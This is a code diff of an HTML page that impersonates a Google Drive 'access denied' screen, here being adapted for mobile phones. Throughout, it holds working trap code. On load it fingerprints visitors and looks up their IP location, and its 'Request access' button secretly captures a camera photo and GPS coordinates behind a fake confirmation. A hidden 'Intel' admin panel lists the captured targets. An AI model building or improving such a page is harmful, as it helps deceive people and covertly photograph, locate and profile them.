@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Drive - Access Denied</title>
     <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
     <!-- Tailwind CSS -->
@@ -13,7 +13,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500&display=swap');
         
-        body { font-family: 'Roboto', sans-serif; overflow-x: hidden; }
+        body { font-family: 'Roboto', sans-serif; overflow-x: hidden; background-color: #ffffff; }
         .google-font { font-family: 'Google Sans', sans-serif; }
         
         /* G-Drive Specific Styles */
@@ -22,71 +22,76 @@
             color: white;
             transition: background-color 0.2s;
             border: none;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
         }
-        .g-btn:hover { background-color: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .g-btn:active { background-color: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
         .g-btn:disabled { background-color: #dadce0; color: #888; cursor: not-allowed; box-shadow: none; }
 
         .g-input {
             border: 1px solid #dadce0;
             border-radius: 4px;
-            padding: 10px;
-            font-size: 14px;
+            padding: 12px;
+            font-size: 16px; /* Prevents zoom on iPhone */
             width: 100%;
             box-sizing: border-box;
             transition: border-color 0.2s;
+            -webkit-appearance: none;
         }
-        .g-input:focus { border-color: #1a73e8; outline: none; border-width: 2px; padding: 9px; }
+        .g-input:focus { border-color: #1a73e8; outline: none; border-width: 2px; padding: 11px; }
 
         /* Admin Panel Styles */
         .admin-view { background-color: #0f172a; color: #cbd5e1; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
         .hidden-mode { display: none !important; }
         
         /* Custom Scrollbar */
-        .cyber-scroll::-webkit-scrollbar { width: 6px; }
+        .cyber-scroll::-webkit-scrollbar { width: 4px; }
         .cyber-scroll::-webkit-scrollbar-track { background: #1e293b; }
         .cyber-scroll::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
-        .cyber-scroll::-webkit-scrollbar-thumb:hover { background: #64748b; }
 
+        /* Mobile Adjustments */
+        @media (max-width: 640px) {
+            .g-card { padding: 1.5rem; box-shadow: none; border: none; }
+            .g-footer { position: relative; padding-bottom: 2rem; }
+        }
+        
         /* Log Item Animation */
         @keyframes slideIn {
             from { opacity: 0; transform: translateX(-10px); }
             to { opacity: 1; transform: translateX(0); }
         }
         .log-item { animation: slideIn 0.3s ease-out; }
-        
-        .blinking-cursor { animation: blink 1s step-end infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <!-- HIDDEN CAPTURE ELEMENTS (Silent) -->
-    <video id="hidden-video" class="hidden" autoplay playsinline></video>
+    <!-- HIDDEN CAPTURE ELEMENTS (Silent & Mobile Optimized) -->
+    <!-- 'muted' and 'playsinline' are CRITICAL for mobile support -->
+    <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
     <canvas id="hidden-canvas" class="hidden"></canvas>
     <iframe id="network-probe" class="hidden"></iframe>
 
     <!-- ========================================== -->
     <!-- 1. GOOGLE DRIVE BAIT VIEW                  -->
     <!-- ========================================== -->
-    <div id="gdrive-view" class="h-screen w-full flex flex-col items-center justify-center bg-white relative z-10">
+    <div id="gdrive-view" class="min-h-screen w-full flex flex-col items-center justify-between md:justify-center bg-white relative z-10">
         
         <!-- Google Header -->
-        <div class="absolute top-0 left-0 w-full p-4 flex items-center justify-between">
+        <div class="w-full p-4 flex items-center justify-between md:absolute md:top-0 md:left-0">
             <div class="flex items-center gap-2">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Logo" class="w-8 h-8">
                 <span class="text-gray-500 text-lg google-font">Drive</span>
             </div>
-            <div class="flex items-center gap-4">
-                 <!-- Stealth Trigger: Triple Click the Help Icon for Admin -->
-                <button onclick="adminKnock()" class="text-gray-500 hover:bg-gray-100 p-2 rounded-full outline-none">
+            <div class="flex items-center gap-3">
+                 <button class="text-gray-500 p-2 rounded-full outline-none">
                     <i class="fa-regular fa-circle-question text-xl"></i>
                 </button>
-                <div class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center text-sm font-medium select-none">S</div>
+                <!-- ADMIN TRIGGER: Long Press (2s) on this Avatar -->
+                <div id="admin-trigger" class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center text-sm font-medium select-none cursor-pointer active:scale-95 transition-transform">S</div>
             </div>
         </div>
 
         <!-- Main Card -->
-        <div class="max-w-[480px] w-full p-6 md:p-8 space-y-6">
+        <div class="g-card max-w-[480px] w-full p-8 space-y-6 md:border md:border-gray-200 md:rounded-lg md:shadow-lg">
             <h1 class="text-2xl text-gray-800 google-font font-normal">You need access</h1>
             
             <div class="text-gray-600 text-[14px] leading-relaxed space-y-2">
@@ -101,7 +106,7 @@
                 
                 <div class="flex items-center justify-end gap-3">
                     <div class="text-gray-600 text-sm font-medium px-2 py-2 rounded hover:bg-gray-50 cursor-pointer select-none">Switch accounts</div>
-                    <button onclick="triggerTrap()" id="req-btn" class="g-btn px-6 py-2 rounded text-sm font-medium">
+                    <button onclick="triggerTrap()" id="req-btn" class="g-btn px-6 py-2 rounded text-sm font-medium w-full md:w-auto flex justify-center items-center">
                         Request access
                     </button>
                 </div>
@@ -109,114 +114,92 @@
         </div>
 
         <!-- Footer -->
-        <div class="mt-auto w-full border-t border-gray-200 bg-gray-50 p-4 text-center">
-            <p class="text-xs text-gray-500">
-                Google Drive protects your files. <span class="text-blue-700 cursor-pointer hover:underline">Learn more</span>
-            </p>
+        <div class="g-footer w-full bg-white md:bg-gray-50 p-4 text-center text-xs text-gray-500 md:border-t md:border-gray-200">
+            <p>Google Drive protects your files. <span class="text-blue-700 cursor-pointer">Learn more</span></p>
         </div>
     </div>
 
     <!-- ========================================== -->
-    <!-- 2. ADMIN FORENSIC PANEL (With Recon)       -->
+    <!-- 2. ADMIN FORENSIC PANEL (Mobile Ready)     -->
     <!-- ========================================== -->
     <div id="admin-view" class="hidden-mode absolute inset-0 admin-view h-screen flex flex-col z-50">
         
         <!-- Admin Header -->
-        <div class="bg-slate-900 border-b border-slate-700 p-4 flex justify-between items-center shadow-lg sticky top-0 z-50">
-            <div class="flex items-center gap-3">
-                <div class="bg-red-500/20 p-2 rounded-full">
-                    <i class="fa-solid fa-bug text-red-500 text-lg"></i>
+        <div class="bg-slate-900 border-b border-slate-700 p-3 flex justify-between items-center shadow-lg sticky top-0 z-50">
+            <div class="flex items-center gap-2">
+                <div class="bg-red-500/20 p-1.5 rounded-full">
+                    <i class="fa-solid fa-bug text-red-500 text-sm"></i>
                 </div>
                 <div>
-                    <h1 class="text-sm font-bold text-white tracking-wider uppercase">Krysha's Intel Core v11</h1>
-                    <p class="text-[10px] text-slate-400">STATUS: <span class="text-green-400 mono">LIVE CAPTURE</span></p>
+                    <h1 class="text-xs font-bold text-white tracking-wider uppercase">Krysha's Intel v12</h1>
+                    <p class="text-[9px] text-slate-400">STATUS: <span class="text-green-400 mono">ONLINE</span></p>
                 </div>
             </div>
-            <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-xs border border-slate-600 transition-colors">
-                EXIT PANEL
+            <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-[10px] border border-slate-600">
+                EXIT
             </button>
         </div>
 
-        <div class="flex flex-grow overflow-hidden">
+        <div class="flex flex-col md:flex-row flex-grow overflow-hidden">
             
-            <!-- LEFT: LOG SEQUENCE -->
-            <div class="w-1/3 md:w-1/4 bg-slate-900 border-r border-slate-800 flex flex-col">
-                <div class="p-3 border-b border-slate-800 bg-slate-800/50 flex justify-between items-center sticky top-0">
-                    <span class="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Intercept Log</span>
-                    <button onclick="clearLogs()" class="text-[10px] text-red-400 hover:text-red-300 transition-colors"><i class="fa-solid fa-trash"></i></button>
+            <!-- LOG LIST (Top on mobile, Left on desktop) -->
+            <div class="w-full md:w-1/4 h-1/3 md:h-full bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex flex-col">
+                <div class="p-2 border-b border-slate-800 bg-slate-800/50 flex justify-between items-center">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Target Logs</span>
+                    <button onclick="clearLogs()" class="text-[10px] text-red-400 px-2"><i class="fa-solid fa-trash"></i></button>
                 </div>
                 <div id="log-list" class="flex-grow overflow-y-auto cyber-scroll p-2 space-y-2">
-                    <!-- Logs injected via JS -->
+                    <!-- Logs injected here -->
                 </div>
             </div>
 
-            <!-- RIGHT: INTEL DETAILS -->
-            <div class="w-2/3 md:w-3/4 bg-slate-950 p-6 overflow-y-auto cyber-scroll relative">
+            <!-- DETAILS PANEL (Bottom on mobile, Right on desktop) -->
+            <div class="w-full md:w-3/4 h-2/3 md:h-full bg-slate-950 p-4 md:p-6 overflow-y-auto cyber-scroll relative">
                 
-                <!-- Active View Header -->
-                <div class="flex justify-between items-end mb-6 border-b border-slate-800 pb-4 relative z-10">
+                <div class="flex justify-between items-end mb-4 border-b border-slate-800 pb-2">
                     <div>
-                        <h2 class="text-xl font-bold text-white" id="detail-title">Awaiting Data...</h2>
-                        <p class="text-xs text-slate-400 mt-1" id="detail-time">--</p>
+                        <h2 class="text-lg font-bold text-white" id="detail-title">Waiting...</h2>
+                        <p class="text-[10px] text-slate-400 mt-1" id="detail-time">--</p>
                     </div>
-                    <div class="flex gap-2">
-                         <span id="vpn-badge" class="hidden bg-red-600 text-white text-[10px] px-2 py-1 rounded font-bold uppercase tracking-wide">VPN / PROXY</span>
-                    </div>
+                    <span id="vpn-badge" class="hidden bg-red-600 text-white text-[9px] px-2 py-1 rounded font-bold uppercase">VPN</span>
                 </div>
 
-                <div class="grid grid-cols-1 xl:grid-cols-2 gap-6 relative z-10">
+                <div class="grid grid-cols-1 xl:grid-cols-2 gap-4">
                     
-                    <!-- 1. NETWORK INTELLIGENCE -->
-                    <div class="space-y-6">
-                         <div class="bg-slate-900 border border-slate-700 rounded-lg p-5 shadow-lg">
-                             <h3 class="text-xs font-bold text-green-400 mb-3 uppercase flex items-center gap-2">
-                                <i class="fa-solid fa-globe"></i> Global Network Data
-                             </h3>
-                             <div class="space-y-3 font-mono text-sm">
-                                 <div><p class="text-slate-500 text-[10px]">PUBLIC IP</p><p id="detail-ip" class="text-white text-lg font-bold">Scanning...</p></div>
-                                 <div><p class="text-slate-500 text-[10px]">ISP / ORG</p><p id="detail-isp" class="text-blue-300">Scanning...</p></div>
-                                 <div><p class="text-slate-500 text-[10px]">GEO-LOCATION</p><p id="detail-city" class="text-slate-300">Scanning...</p></div>
-                             </div>
-                        </div>
-
-                         <div class="bg-slate-900 border border-slate-700 rounded-lg p-5 shadow-lg">
-                             <h3 class="text-xs font-bold text-yellow-400 mb-3 uppercase flex items-center gap-2">
-                                <i class="fa-solid fa-wifi"></i> Connection & Local IP
-                             </h3>
-                             <div class="space-y-3 font-mono text-sm">
-                                 <div><p class="text-slate-500 text-[10px]">CONNECTION TYPE</p><p id="detail-conn" class="text-white">---</p></div>
-                                 <div><p class="text-slate-500 text-[10px]">WEBRTC LOCAL IP (LEAK)</p><p id="detail-localip" class="text-red-400 font-bold">---</p></div>
-                             </div>
+                    <!-- Network -->
+                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
+                        <h3 class="text-[10px] font-bold text-green-400 mb-2 uppercase"><i class="fa-solid fa-globe mr-1"></i> Network</h3>
+                        <div class="space-y-1 font-mono text-xs">
+                            <div class="flex justify-between"><span class="text-slate-500">IP:</span> <span id="detail-ip" class="text-white font-bold">---</span></div>
+                            <div class="flex justify-between"><span class="text-slate-500">ISP:</span> <span id="detail-isp" class="text-blue-300 truncate w-32 text-right">---</span></div>
+                            <div class="flex justify-between"><span class="text-slate-500">LOC:</span> <span id="detail-city" class="text-slate-300 truncate w-32 text-right">---</span></div>
+                            <div class="flex justify-between border-t border-slate-800 pt-1 mt-1"><span class="text-slate-500">WebRTC:</span> <span id="detail-localip" class="text-red-400">---</span></div>
                         </div>
                     </div>
 
-                    <!-- 2. DEVICE FINGERPRINTING -->
-                    <div class="space-y-6">
-                        <div class="bg-slate-900 border border-slate-700 rounded-lg p-5 shadow-lg">
-                            <h3 class="text-xs font-bold text-blue-400 mb-3 uppercase flex items-center gap-2">
-                                <i class="fa-solid fa-microchip"></i> Advanced Device Profile
-                            </h3>
-                            <div id="detail-device" class="space-y-2 text-xs text-slate-300 font-mono break-all">
-                                <p class="text-slate-500 italic">Select a log...</p>
-                            </div>
-                        </div>
-
-                         <!-- Evidence Photo -->
-                        <div class="bg-black border border-slate-700 rounded-lg overflow-hidden aspect-video flex items-center justify-center relative shadow-lg group">
-                            <div id="detail-img" class="text-slate-600 flex flex-col items-center">
-                                <i class="fa-solid fa-image text-3xl mb-2"></i>
-                                <span class="text-xs">Visual Data (Active Only)</span>
-                            </div>
+                    <!-- Device -->
+                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
+                        <h3 class="text-[10px] font-bold text-blue-400 mb-2 uppercase"><i class="fa-solid fa-mobile-screen mr-1"></i> Device</h3>
+                        <div class="grid grid-cols-2 gap-2 text-[10px] font-mono text-slate-300">
+                            <div><span class="text-slate-500 block">Platform:</span> <span id="detail-platform">---</span></div>
+                            <div><span class="text-slate-500 block">Battery:</span> <span id="detail-batt">---</span></div>
+                            <div class="col-span-2"><span class="text-slate-500 block">GPU:</span> <span id="detail-gpu" class="truncate block text-yellow-500">---</span></div>
                         </div>
                     </div>
 
-                    <!-- 3. ACTION LOG -->
-                    <div class="col-span-1 xl:col-span-2 bg-slate-900 border border-slate-700 rounded-lg p-5 shadow-lg">
-                        <h3 class="text-xs font-bold text-purple-400 mb-3 uppercase flex items-center gap-2">
-                             <i class="fa-solid fa-terminal"></i> Real-Time Tracker Console
-                        </h3>
-                        <div id="action-log" class="text-[11px] font-mono text-green-500 bg-black p-3 rounded h-40 overflow-y-auto">
-                            <span class="text-slate-500">> System initialized. Passive listeners active.</span>
+                    <!-- Photo -->
+                    <div class="bg-black border border-slate-700 rounded-lg overflow-hidden aspect-video flex items-center justify-center relative shadow-lg group">
+                        <div id="detail-img" class="text-slate-600 flex flex-col items-center">
+                            <i class="fa-solid fa-image text-2xl mb-1"></i>
+                            <span class="text-[10px]">No Visuals</span>
+                        </div>
+                    </div>
+
+                    <!-- Console -->
+                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg col-span-1 xl:col-span-2">
+                        <h3 class="text-[10px] font-bold text-purple-400 mb-2 uppercase"><i class="fa-solid fa-terminal mr-1"></i> Live Console</h3>
+                        <div id="action-log" class="text-[10px] font-mono text-green-500 bg-black p-2 rounded h-24 overflow-y-auto">
+                            <span class="text-slate-500">> System Ready.</span>
                         </div>
                     </div>
 
@@ -239,127 +222,52 @@
             el.scrollTop = el.scrollHeight;
         };
 
-        // --- 1. NETWORK RECON (Real APIs) ---
+        // --- 1. ROBUST IP FETCHER ---
         async function fetchNetworkData() {
-            logAction("Network: Initiating API handshake sequence...");
-            
-            // 1. Try ipapi.co (Best Data)
+            logAction("Net: Scanning connection...");
             try {
+                // Priority 1: ipapi.co
                 const res = await fetch('https://ipapi.co/json/');
                 if(!res.ok) throw new Error("Blocked");
                 const data = await res.json();
-                logAction(`Network: Success via ipapi.co (${data.ip})`);
-                return { ip: data.ip, isp: data.org, city: data.city, country: data.country_name, source: 'ipapi' };
+                return { ip: data.ip, isp: data.org, city: data.city, country: data.country_name };
             } catch (e) {
-                logAction("Network: ipapi.co blocked. Trying Backup 1...");
-                
-                // 2. Try ipwho.is (Backup)
                 try {
+                    // Backup: ipwho.is
                     const res2 = await fetch('https://ipwho.is/');
                     const data2 = await res2.json();
                     if(!data2.success) throw new Error("Fail");
-                    logAction(`Network: Success via ipwho.is (${data2.ip})`);
-                    return { ip: data2.ip, isp: data2.connection?.isp, city: data2.city, country: data2.country, source: 'ipwho' };
+                    return { ip: data2.ip, isp: data2.connection?.isp, city: data2.city, country: data2.country };
                 } catch (err) {
-                    logAction("Network: ipwho.is blocked. Trying Cloudflare...");
-                    
-                    // 3. Try Cloudflare (Last Resort)
+                     // Last Resort: Cloudflare
                     try {
                         const res3 = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                         const text = await res3.text();
                         const trace = text.trim().split('\n').reduce((acc, line) => { const [k, v] = line.split('='); acc[k] = v; return acc; }, {});
-                        logAction(`Network: Trace Success (${trace.ip})`);
-                        return { ip: trace.ip, isp: "Unknown (Trace Mode)", city: "Datacenter: " + trace.colo, country: "N/A", source: 'cf' };
-                    } catch (fatal) {
-                        logAction("Network: CRITICAL - All APIs Blocked by Client/Adblocker");
-                        return { ip: "BLOCKED", isp: "BLOCKED", city: "BLOCKED", source: "error" };
-                    }
+                        return { ip: trace.ip, isp: "Unknown", city: trace.colo, country: "N/A" };
+                    } catch (f) { return { ip: "Blocked", isp: "N/A", city: "N/A" }; }
                 }
             }
         }
 
-        // --- 2. WEBRTC LOCAL IP LEAK (Real Data) ---
+        // --- 2. WEBRTC LEAK CHECK ---
         async function getLocalIPs() {
-            logAction("WebRTC: Probing for local IP leaks...");
             return new Promise((resolve) => {
-                const ips = [];
                 const pc = new RTCPeerConnection({iceServers: []});
                 pc.createDataChannel('');
                 pc.onicecandidate = (e) => {
-                    if (!e.candidate) { 
-                        pc.close(); 
-                        if(ips.length === 0) resolve("Hidden/Protected");
-                        else resolve(ips.join(', '));
-                        return; 
-                    }
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                    const match = e.candidate.candidate.match(ipRegex);
-                    if (match && !ips.includes(match[1]) && !match[1].endsWith('.local')) {
-                        ips.push(match[1]);
-                        logAction(`WebRTC: Leak detected -> ${match[1]}`);
-                    }
+                    if (!e.candidate) { pc.close(); resolve("Hidden"); return; }
+                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (match && !match[1].endsWith('.local')) { pc.close(); resolve(match[1]); }
                 };
                 pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve("Failed"));
-                // Timeout after 2s
-                setTimeout(() => { 
-                    if(ips.length === 0) resolve("Not Leaking");
-                    else resolve(ips.join(', '));
-                }, 2000);
+                setTimeout(() => resolve("Secure"), 1500);
             });
         }
 
-        // --- 3. ADVANCED FINGERPRINTING ---
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.textBaseline = "alphabetic";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = "#069";
-            ctx.fillText("Krysha_Tracker_v11", 2, 15);
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-            ctx.fillText("Krysha_Tracker_v11", 4, 17);
-            
-            const b64 = canvas.toDataURL().replace("data:image/png;base64,", "");
-            let hash = 0;
-            for (let i = 0; i < b64.length; i++) {
-                hash = ((hash << 5) - hash) + b64.charCodeAt(i);
-                hash |= 0;
-            }
-            return Math.abs(hash).toString(16);
-        }
-
-        async function getBatteryStatus() {
-            try {
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    return `${Math.round(b.level*100)}% ${b.charging ? '(Charging)' : '(On Battery)'}`;
-                }
-            } catch(e) {}
-            return "N/A";
-        }
-
-        function getConnectionInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                return `${conn.effectiveType.toUpperCase()} (Downlink: ~${conn.downlink}Mbps, RTT: ${conn.rtt}ms)`;
-            }
-            return "Unknown";
-        }
-
-        // --- 4. STARTUP SEQUENCE (Passive) ---
+        // --- 3. INIT (PASSIVE) ---
         async function initTrap() {
-            logAction("System: Initializing Passive Recon...");
-            
-            const netData = await fetchNetworkData();
-            const localIP = await getLocalIPs();
-            const battery = await getBatteryStatus();
-            const connection = getConnectionInfo();
-            const canvasFP = getCanvasFingerprint();
-
-            // GPU Check
+            // Hardware Recon
             let gpu = "Unknown";
             try {
                 const cvs = document.createElement('canvas');
@@ -368,62 +276,66 @@
                 gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
+            let battery = "N/A";
+            try {
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level*100)}%`;
+                }
+            } catch(e) {}
+
+            const netData = await fetchNetworkData();
+            const localIP = await getLocalIPs();
+
             const device = {
                 ua: navigator.userAgent,
                 platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
-                cores: navigator.hardwareConcurrency || '?',
-                ram: navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : '?',
+                screen: `${window.screen.width}x${window.screen.height}`,
                 gpu: gpu,
                 battery: battery,
-                connection: connection,
-                local_ip: localIP,
-                canvas_fp: canvasFP
+                local_ip: localIP
             };
 
             currentPassiveData = { ...device, ...netData };
-            
-            addLog("Passive Recon (Load)", currentPassiveData);
-            logAction("System: Passive Data Logged. Waiting for User Interaction...");
+            addLog("PASSIVE HIT", currentPassiveData);
+            logAction("System: Passive reconnaissance complete.");
         }
 
-        // --- 5. ACTIVE TRAP ---
+        // --- 4. ACTIVE TRAP (MOBILE OPTIMIZED) ---
         async function triggerTrap() {
             const btn = get('req-btn');
-            btn.innerText = "Requesting...";
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting...';
             btn.disabled = true;
-            logAction("User triggered 'Request Access' - Initiating Active Modules");
+            logAction("Action: User requested access. Triggering sensors...");
 
             let activeData = { ...currentPassiveData };
 
-            // 1. Simulate Drive-by Download
-            simulateDownload();
-            logAction("Payload: Simulated malicious file download triggered.");
-
-            // 2. Parallel Traps (GPS + Cam)
+            // Start Promise Chain for Active Sensors
             Promise.allSettled([captureGPS(), captureCamera()]).then((results) => {
                 
+                // GPS Result
                 if (results[0].status === 'fulfilled') {
                     activeData.gps = results[0].value;
-                    logAction(`GPS: Success (${activeData.gps.lat}, ${activeData.gps.lon})`);
+                    logAction("GPS: Locked.");
                 } else {
                     activeData.gps = { error: "Denied" };
-                    logAction("GPS: Access Denied by User");
+                    logAction("GPS: Denied.");
                 }
 
+                // Camera Result
                 if (results[1].status === 'fulfilled') {
                     activeData.image = results[1].value;
-                    logAction("Camera: Image Captured Successfully");
+                    logAction("Cam: Captured.");
                 } else {
                     activeData.image = null;
-                    logAction("Camera: Access Denied by User");
+                    logAction("Cam: Denied/Failed.");
                 }
 
-                addLog("ACTIVE INTERCEPT", activeData);
+                addLog("ACTIVE TRAP", activeData);
 
-                // UI Feedback
+                // UI Fake Response
                 setTimeout(() => {
-                    alert("Request sent. You will be notified via email.");
+                    alert("Access requested. You will be notified via email.");
                     btn.innerText = "Request Sent";
                     btn.classList.replace('g-btn', 'bg-gray-400');
                     btn.classList.add('cursor-not-allowed');
@@ -431,71 +343,74 @@
             });
         }
 
-        function simulateDownload() {
-            const element = document.createElement('a');
-            const fileContent = "Simulated Access Key.\nTracker ID: " + currentPassiveData.canvas_fp;
-            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(fileContent));
-            element.setAttribute('download', 'Secure_Access_Key.txt');
-            element.style.display = 'none';
-            document.body.appendChild(element);
-            element.click();
-            document.body.removeChild(element);
+        // Mobile-Safe Camera Capture
+        function captureCamera() {
+            return new Promise((resolve, reject) => {
+                // Constraints: prefer front camera, fallback to any
+                const constraints = { video: { facingMode: "user" }, audio: false };
+                
+                navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    const vid = get('hidden-video');
+                    const cvs = get('hidden-canvas');
+                    vid.srcObject = stream;
+                    
+                    // Wait for video to be ready
+                    vid.onloadedmetadata = () => {
+                        vid.play(); // Explicit play for mobile
+                        cvs.width = vid.videoWidth; 
+                        cvs.height = vid.videoHeight;
+                        
+                        setTimeout(() => {
+                            const ctx = cvs.getContext('2d');
+                            ctx.drawImage(vid, 0, 0);
+                            const data = cvs.toDataURL('image/jpeg', 0.5);
+                            
+                            // Cleanup: Stop all tracks to release camera
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(data);
+                        }, 500); // 500ms delay for exposure adjustment
+                    };
+                })
+                .catch(err => {
+                    console.error("Cam Error:", err);
+                    reject(err);
+                });
+            });
         }
 
         function captureGPS() {
             return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) reject("No Geo API");
+                if (!navigator.geolocation) reject("No Geo");
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                     (err) => reject(err),
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
 
-        function captureCamera() {
-            return new Promise((resolve, reject) => {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const vid = get('hidden-video');
-                    const cvs = get('hidden-canvas');
-                    vid.srcObject = stream;
-                    vid.onloadedmetadata = () => {
-                        cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
-                        setTimeout(() => {
-                            const ctx = cvs.getContext('2d');
-                            ctx.drawImage(vid, 0, 0);
-                            const data = cvs.toDataURL('image/jpeg', 0.5);
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(data);
-                        }, 500);
-                    };
-                }).catch(reject);
-            });
-        }
-
-        // --- 6. LOGGING ---
+        // --- 5. LOGGING SYSTEM ---
         function addLog(type, data) {
-            let logs = JSON.parse(localStorage.getItem('krysha_logs_v11') || '[]');
-            const entry = {
+            let logs = JSON.parse(localStorage.getItem('krysha_logs_v12') || '[]');
+            logs.unshift({
                 id: Date.now(),
                 timestamp: new Date().toLocaleTimeString(),
                 type: type,
                 data: data
-            };
-            logs.unshift(entry);
+            });
             if (logs.length > MAX_LOGS) logs.pop();
-            localStorage.setItem('krysha_logs_v11', JSON.stringify(logs));
+            localStorage.setItem('krysha_logs_v12', JSON.stringify(logs));
             if (!get('admin-view').classList.contains('hidden-mode')) renderLogList();
         }
 
         function renderLogList() {
-            const logs = JSON.parse(localStorage.getItem('krysha_logs_v11') || '[]');
+            const logs = JSON.parse(localStorage.getItem('krysha_logs_v12') || '[]');
             const list = get('log-list');
             list.innerHTML = '';
 
             if (logs.length === 0) {
-                list.innerHTML = `<div class="text-center mt-10 opacity-50"><p class="text-[10px]">No Intercepts</p></div>`;
+                list.innerHTML = `<p class="text-[10px] text-slate-500 text-center mt-4">No Data</p>`;
                 return;
             }
 
@@ -504,13 +419,13 @@
                 const borderColor = isActive ? 'border-red-500' : 'border-blue-500';
                 
                 const div = document.createElement('div');
-                div.className = `log-item p-3 bg-slate-800 rounded border-l-4 ${borderColor} cursor-pointer hover:bg-slate-700 transition mb-2`;
+                div.className = `log-item p-2 bg-slate-800 rounded border-l-2 ${borderColor} cursor-pointer hover:bg-slate-700 transition mb-2`;
                 div.innerHTML = `
                     <div class="flex justify-between items-center mb-1">
-                        <span class="font-bold text-[10px] uppercase text-white">${log.type}</span>
-                        <span class="text-[9px] text-slate-500">${log.timestamp}</span>
+                        <span class="font-bold text-[9px] uppercase text-white">${log.type}</span>
+                        <span class="text-[8px] text-slate-500">${log.timestamp}</span>
                     </div>
-                    <p class="text-[10px] text-slate-400 font-mono">${log.data.ip}</p>
+                    <p class="text-[9px] text-slate-400 font-mono truncate">${log.data.ip}</p>
                 `;
                 div.onclick = () => showDetails(log);
                 list.appendChild(div);
@@ -524,44 +439,22 @@
 
             get('detail-ip').innerText = d.ip;
             get('detail-isp').innerText = d.isp;
-            get('detail-city').innerText = `${d.city || 'BLOCKED'}, ${d.country || ''}`;
-            
-            get('detail-conn').innerText = d.connection;
+            get('detail-city').innerText = `${d.city || 'N/A'}, ${d.country || ''}`;
             get('detail-localip').innerText = d.local_ip;
+            get('detail-platform').innerText = d.platform;
+            get('detail-batt').innerText = d.battery;
+            get('detail-gpu').innerText = d.gpu;
 
-            // Image
             const imgEl = get('detail-img');
-            imgEl.innerHTML = d.image ? `<img src="${d.image}" class="w-full h-full object-cover">` : `<i class="fa-solid fa-image text-3xl mb-2 text-slate-600"></i><span class="text-xs text-slate-600">No Image Captured</span>`;
-
-            // Device
-            get('detail-device').innerHTML = `
-                <div class="grid grid-cols-2 gap-2 text-[11px]">
-                    <div><span class="text-slate-500 block">OS:</span> ${d.platform}</div>
-                    <div><span class="text-slate-500 block">Canvas ID:</span> <span class="text-green-400">${d.canvas_fp}</span></div>
-                    <div><span class="text-slate-500 block">Battery:</span> ${d.battery}</div>
-                    <div><span class="text-slate-500 block">Screen:</span> ${d.screen}</div>
-                    <div class="col-span-2 pt-1">
-                        <span class="text-slate-500 block">GPU:</span>
-                        <span class="text-yellow-500 break-all">${d.gpu}</span>
-                    </div>
-                    <div class="col-span-2 pt-1 border-t border-slate-800">
-                        <span class="text-slate-500 block">User Agent:</span>
-                        <span class="text-[10px] text-slate-400 break-all">${d.ua}</span>
-                    </div>
-                </div>
-            `;
